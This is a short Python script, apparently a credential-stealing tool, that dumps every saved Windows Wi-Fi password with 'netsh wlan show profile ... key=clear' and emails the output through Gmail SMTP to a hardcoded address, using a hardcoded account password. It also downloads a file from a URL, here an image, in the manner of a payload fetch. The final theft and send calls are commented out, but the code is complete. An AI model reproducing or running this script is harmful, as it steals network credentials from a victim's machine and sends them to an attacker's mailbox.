#!/usr/bin/env python

import subprocess
import smtplib
import re
import requests

PROG_NAME="Ex and Rep"
EMAIL = "ryuzaki.hcker@gmail.com"
PASSWORD = "ml2yvCuCRz7OxDWy2lgshHrWxbrlGGhRH"
SMTP_SEVER_URL = "smtp.gmail.com"
SMTP_PORT = 587
FILE_LINK = "https://upload.wikimedia.org/wikipedia/commons/thumb/9/9c/Hummer_H2_.jpg/1200px-Hummer_H2_.jpg"
def send_email(email, password, msg, subject = "") :
      server = smtplib.SMTP(SMTP_SEVER_URL, SMTP_PORT)
      server.starttls()
      server.login(email,password)
      server.sendmail(email,email,msg)
      server.quit()

def find_wlan_passwd():
      #commande0 = "Netsh wlan show profile [SSID] key=clear"
      output = ""

      commande = "netsh wlan show profile "
      out = subprocess.check_output(commande,shell=True)
      wlans_ssid = re.findall(r"(?:Profile\s*:\s)(.*)", out)

      for ssid in wlans_ssid :
            out = subprocess.check_output(commande + ssid + " key=clear" )
            output += out 
      return output
def download_file(url):
     get_resp = requests.get(url)
     file_name = url.split("/")[-1]
     with open(file_name,"wb") as out_file:
           out_file.write(get_resp.content)

            

download_file(FILE_LINK)
#wlans_passwd = find_wlan_passwd()

#send_email(EMAIL, PASSWORD, wlans_passwd)